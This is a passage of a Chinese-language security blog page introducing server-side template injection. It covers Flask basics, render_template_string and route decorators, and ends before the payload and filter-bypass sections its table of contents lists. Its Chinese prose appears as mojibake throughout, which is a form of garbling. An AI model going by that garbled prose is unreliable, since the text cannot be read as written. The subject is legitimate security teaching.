<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="SSTI ï¼ˆServer-Side Template Injectionï¼‰æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥\nç‰¹å¾ï¼š\nç½‘ç«™èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„è‡ªå®šä¹‰å†…å®¹ï¼Œå¹¶ä»¥ä¸€ç§â€œæ¨¡æ¿â€çš„å½¢å¼ {} èƒŒæ™¯ æ¨¡æ¿çš„è¯ç”Ÿæ˜¯ä¸ºäº†å°†æ˜¾ç¤ºä¸æ•°æ®åˆ†ç¦»ï¼Œæ¨¡æ¿æŠ€æœ¯å¤šç§å¤šæ ·ï¼Œä½†å…¶æœ¬è´¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®é€šè¿‡æ¨¡æ¿å¼•æ“ç”Ÿæˆæœ€ç»ˆçš„HTMLä»£ç ã€‚\né€šä¿—ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ å¸¸è§æ¨¡æ¿æœ‰ï¼š\npythonæ¡†æ¶ jinja2 mako tornado django PHPæ¡†æ¶ smarty twig javaæ¡†æ¶ jade velocity è¿™äº›æ¡†æ¶ä½¿ç”¨æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ã€‚\nflask åŸºç¡€ å¸¸è§çš„åŸºäºPythonçš„æ¨¡æ¿ å®ä¾‹ï¼šæœ€å°çš„ flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from flask import Flask # å¯¼å…¥Flaskç±».ç”¨äºåé¢å®ä¾‹åŒ–å‡ºä¸€ä¸ªWSGIåº”ç”¨ç¨‹åº. app = Flask(__name__) # åˆ›å»ºFlaskå®ä¾‹,ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¨¡å—æˆ–åŒ…å. @app.route('/') # route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ï¼Œå³æŠŠ helloworld è¿™ä¸ªå‡½æ•°ä¸æ ¹ç›®å½•ç»‘å®š # ä½¿ç”¨ route() è£…é¥°å™¨å‘Šè¯‰ Flask ä»€ä¹ˆæ ·çš„ URL èƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•° def hello_world(): # put application's code here return 'Hello World!' if __name__ == '__main__': app.run() # app.run()å‡½æ•°è®©åº”ç”¨åœ¨æœ¬åœ°å¯åŠ¨ route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ python3æ‰§è¡Œï¼š\n"><title>SSTI æ¼æ´</title>
<link rel=canonical href=https://bu44er.ink/p/6b9l0s6c/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="SSTI æ¼æ´"><meta property='og:description' content="SSTI ï¼ˆServer-Side Template Injectionï¼‰æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥\nç‰¹å¾ï¼š\nç½‘ç«™èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„è‡ªå®šä¹‰å†…å®¹ï¼Œå¹¶ä»¥ä¸€ç§â€œæ¨¡æ¿â€çš„å½¢å¼ {} èƒŒæ™¯ æ¨¡æ¿çš„è¯ç”Ÿæ˜¯ä¸ºäº†å°†æ˜¾ç¤ºä¸æ•°æ®åˆ†ç¦»ï¼Œæ¨¡æ¿æŠ€æœ¯å¤šç§å¤šæ ·ï¼Œä½†å…¶æœ¬è´¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®é€šè¿‡æ¨¡æ¿å¼•æ“ç”Ÿæˆæœ€ç»ˆçš„HTMLä»£ç ã€‚\né€šä¿—ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ å¸¸è§æ¨¡æ¿æœ‰ï¼š\npythonæ¡†æ¶ jinja2 mako tornado django PHPæ¡†æ¶ smarty twig javaæ¡†æ¶ jade velocity è¿™äº›æ¡†æ¶ä½¿ç”¨æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ã€‚\nflask åŸºç¡€ å¸¸è§çš„åŸºäºPythonçš„æ¨¡æ¿ å®ä¾‹ï¼šæœ€å°çš„ flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from flask import Flask # å¯¼å…¥Flaskç±».ç”¨äºåé¢å®ä¾‹åŒ–å‡ºä¸€ä¸ªWSGIåº”ç”¨ç¨‹åº. app = Flask(__name__) # åˆ›å»ºFlaskå®ä¾‹,ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¨¡å—æˆ–åŒ…å. @app.route('/') # route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ï¼Œå³æŠŠ helloworld è¿™ä¸ªå‡½æ•°ä¸æ ¹ç›®å½•ç»‘å®š # ä½¿ç”¨ route() è£…é¥°å™¨å‘Šè¯‰ Flask ä»€ä¹ˆæ ·çš„ URL èƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•° def hello_world(): # put application's code here return 'Hello World!' if __name__ == '__main__': app.run() # app.run()å‡½æ•°è®©åº”ç”¨åœ¨æœ¬åœ°å¯åŠ¨ route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ python3æ‰§è¡Œï¼š\n"><meta property='og:url' content='https://bu44er.ink/p/6b9l0s6c/'><meta property='og:site_name' content="BU44ER's BLOG"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='WEB'><meta property='article:published_time' content='2024-09-21T19:17:14+08:00'><meta property='article:modified_time' content='2024-09-21T19:17:14+08:00'><meta name=twitter:title content="SSTI æ¼æ´"><meta name=twitter:description content="SSTI ï¼ˆServer-Side Template Injectionï¼‰æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥\nç‰¹å¾ï¼š\nç½‘ç«™èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„è‡ªå®šä¹‰å†…å®¹ï¼Œå¹¶ä»¥ä¸€ç§â€œæ¨¡æ¿â€çš„å½¢å¼ {} èƒŒæ™¯ æ¨¡æ¿çš„è¯ç”Ÿæ˜¯ä¸ºäº†å°†æ˜¾ç¤ºä¸æ•°æ®åˆ†ç¦»ï¼Œæ¨¡æ¿æŠ€æœ¯å¤šç§å¤šæ ·ï¼Œä½†å…¶æœ¬è´¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®é€šè¿‡æ¨¡æ¿å¼•æ“ç”Ÿæˆæœ€ç»ˆçš„HTMLä»£ç ã€‚\né€šä¿—ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚ å¸¸è§æ¨¡æ¿æœ‰ï¼š\npythonæ¡†æ¶ jinja2 mako tornado django PHPæ¡†æ¶ smarty twig javaæ¡†æ¶ jade velocity è¿™äº›æ¡†æ¶ä½¿ç”¨æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ã€‚\nflask åŸºç¡€ å¸¸è§çš„åŸºäºPythonçš„æ¨¡æ¿ å®ä¾‹ï¼šæœ€å°çš„ flask 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from flask import Flask # å¯¼å…¥Flaskç±».ç”¨äºåé¢å®ä¾‹åŒ–å‡ºä¸€ä¸ªWSGIåº”ç”¨ç¨‹åº. app = Flask(__name__) # åˆ›å»ºFlaskå®ä¾‹,ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¨¡å—æˆ–åŒ…å. @app.route('/') # route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ï¼Œå³æŠŠ helloworld è¿™ä¸ªå‡½æ•°ä¸æ ¹ç›®å½•ç»‘å®š # ä½¿ç”¨ route() è£…é¥°å™¨å‘Šè¯‰ Flask ä»€ä¹ˆæ ·çš„ URL èƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•° def hello_world(): # put application's code here return 'Hello World!' if __name__ == '__main__': app.run() # app.run()å‡½æ•°è®©åº”ç”¨åœ¨æœ¬åœ°å¯åŠ¨ route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ python3æ‰§è¡Œï¼š\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_6bb6a4306bf01844.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¥</span></figure><div class=site-meta><h1 class=site-name><a href=/>BU44ER's BLOG</a></h1><h2 class=site-description>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2></div></header><ol class=menu-social><li><a href=https://github.com/cynicalight target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#èƒŒæ™¯>èƒŒæ™¯</a></li><li><a href=#flask-åŸºç¡€>flask åŸºç¡€</a><ol><li><a href=#å®ä¾‹æœ€å°çš„-flask>å®ä¾‹ï¼šæœ€å°çš„ flask</a></li><li><a href=#æ¸²æŸ“æ–¹æ³•>æ¸²æŸ“æ–¹æ³•</a></li><li><a href=#route-è£…é¥°å™¨è·¯ç”±>route è£…é¥°å™¨è·¯ç”±</a></li><li><a href=#é‡ç‚¹æ¨¡æ¿æ¸²æŸ“>é‡ç‚¹ï¼šæ¨¡æ¿æ¸²æŸ“</a></li></ol></li><li><a href=#python-é­”æœ¯æ–¹æ³•>python é­”æœ¯æ–¹æ³•</a><ol><li><ol><li><a href=#å®ä¾‹>å®ä¾‹</a></li></ol></li></ol></li><li><a href=#ç›´æ¥çš„-xss-æ³¨å…¥>ç›´æ¥çš„ XSS æ³¨å…¥</a></li><li><a href=#æ¨¡æ¿æ³¨å…¥>æ¨¡æ¿æ³¨å…¥</a><ol><li><a href=#æ‰‹å·¥-payload>æ‰‹å·¥ payload</a></li></ol></li><li><a href=#ç»•è¿‡>ç»•è¿‡</a><ol><li><a href=#-è¿‡æ»¤><code>{{}}</code> è¿‡æ»¤</a></li><li><a href=#-è¿‡æ»¤-1><code>.</code> è¿‡æ»¤</a></li><li><a href=#-è¿‡æ»¤-2><code>[]</code> è¿‡æ»¤</a></li><li><a href=#-è¿‡æ»¤-3><code>"</code> è¿‡æ»¤</a></li><li><a href=#å…³é”®å­—è¿‡æ»¤>å…³é”®å­—è¿‡æ»¤</a></li><li><a href=#-è¿‡æ»¤-4><code>/</code> è¿‡æ»¤</a></li></ol></li><li><a href=#å‚è€ƒ>å‚è€ƒ</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/6b9l0s6c/>SSTI æ¼æ´</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Sep 21, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><p>SSTI ï¼ˆServer-Side Template Injectionï¼‰æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p><p>ç‰¹å¾ï¼š</p><ul><li>ç½‘ç«™èƒ½å¤Ÿè¿”å›ç”¨æˆ·çš„è‡ªå®šä¹‰å†…å®¹ï¼Œå¹¶ä»¥ä¸€ç§â€œæ¨¡æ¿â€çš„å½¢å¼</li><li><code>{}</code></li></ul><hr><h2 id=èƒŒæ™¯>èƒŒæ™¯</h2><p>æ¨¡æ¿çš„è¯ç”Ÿæ˜¯ä¸ºäº†å°†æ˜¾ç¤ºä¸æ•°æ®åˆ†ç¦»ï¼Œæ¨¡æ¿æŠ€æœ¯å¤šç§å¤šæ ·ï¼Œä½†å…¶æœ¬è´¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶å’Œæ•°æ®é€šè¿‡æ¨¡æ¿å¼•æ“ç”Ÿæˆæœ€ç»ˆçš„HTMLä»£ç ã€‚</p><ul><li>é€šä¿—ç†è§£ï¼šæ‹¿åˆ°æ•°æ®ï¼Œå¡åˆ°æ¨¡æ¿é‡Œï¼Œç„¶åè®©æ¸²æŸ“å¼•æ“å°†èµ›è¿›å»çš„ä¸œè¥¿ç”Ÿæˆ html çš„æ–‡æœ¬ï¼Œè¿”å›ç»™æµè§ˆå™¨ï¼Œè¿™æ ·åšçš„å¥½å¤„å±•ç¤ºæ•°æ®å¿«ï¼Œå¤§å¤§æå‡æ•ˆç‡ã€‚</li></ul><p>å¸¸è§æ¨¡æ¿æœ‰ï¼š</p><ul><li>pythonæ¡†æ¶ jinja2 mako tornado django</li><li>PHPæ¡†æ¶ smarty twig</li><li>javaæ¡†æ¶ jade velocity</li></ul><p>è¿™äº›æ¡†æ¶ä½¿ç”¨æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ã€‚</p><hr><h2 id=flask-åŸºç¡€>flask åŸºç¡€</h2><ul><li>å¸¸è§çš„åŸºäºPythonçš„æ¨¡æ¿</li></ul><h3 id=å®ä¾‹æœ€å°çš„-flask>å®ä¾‹ï¼šæœ€å°çš„ flask</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl><span class=c1># å¯¼å…¥Flaskç±».ç”¨äºåé¢å®ä¾‹åŒ–å‡ºä¸€ä¸ªWSGIåº”ç”¨ç¨‹åº.</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># åˆ›å»ºFlaskå®ä¾‹,ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¨¡å—æˆ–åŒ…å.</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥ï¼Œå³æŠŠ helloworld è¿™ä¸ªå‡½æ•°ä¸æ ¹ç›®å½•ç»‘å®š</span>
</span></span><span class=line><span class=cl><span class=c1># ä½¿ç”¨ route() è£…é¥°å™¨å‘Šè¯‰ Flask ä»€ä¹ˆæ ·çš„ URL èƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•°</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>  <span class=c1># put application&#39;s code here</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;Hello World!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># app.run()å‡½æ•°è®©åº”ç”¨åœ¨æœ¬åœ°å¯åŠ¨</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>route è£…é¥°å™¨çš„ä½œç”¨æ˜¯å°†å‡½æ•°ä¸urlç»‘å®šèµ·æ¥</li></ul><p>python3æ‰§è¡Œï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>python3 hello.py         
</span></span><span class=line><span class=cl> * Serving Flask app <span class=s1>&#39;hello&#39;</span>
</span></span><span class=line><span class=cl> * Debug mode: off
</span></span><span class=line><span class=cl>WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
</span></span><span class=line><span class=cl> * Running on http://127.0.0.1:5000
</span></span><span class=line><span class=cl>Press CTRL+C to quit
</span></span></code></pre></td></tr></table></div></div><h3 id=æ¸²æŸ“æ–¹æ³•>æ¸²æŸ“æ–¹æ³•</h3><p>flaskçš„æ¸²æŸ“æ–¹æ³•æœ‰ <code>render_template</code> å’Œ <code>render_template_string</code> ä¸¤ç§ã€‚</p><p><code>render_template()</code> æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶çš„ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><code>render_template_string</code> åˆ™æ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªå­—ç¬¦ä¸²çš„ï¼ŒSSTIä¸è¿™ä¸ªæ–¹æ³•å¯†ä¸å¯åˆ†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>html</span> <span class=o>=</span> <span class=s1>&#39;&lt;h1&gt;This is index page&lt;/h1&gt;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>html</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=route-è£…é¥°å™¨è·¯ç”±>route è£…é¥°å™¨è·¯ç”±</h3><p>ä½¿ç”¨route()è£…é¥°å™¨å‘Šè¯‰Flaskä»€ä¹ˆæ ·çš„URLèƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•°ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>.route()è£…é¥°å™¨æŠŠä¸€ä¸ªå‡½æ•°ç»‘å®šåˆ°å¯¹åº”çš„URLä¸Šï¼Œè¿™å¥è¯ç›¸å½“äºè·¯ç”±ï¼Œä¸€ä¸ªè·¯ç”±è·Ÿéšä¸€ä¸ªå‡½æ•°ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test</span><span class=p>():</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=mi>123</span>
</span></span></code></pre></td></tr></table></div></div><p>æ­¤å¤–è¿˜å¯ä»¥è®¾ç½®åŠ¨æ€ç½‘å€</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/hello/&lt;username&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_user</span><span class=p>(</span><span class=n>username</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=s2>&#34;user:</span><span class=si>%s</span><span class=s2>&#34;</span><span class=o>%</span><span class=n>username</span>
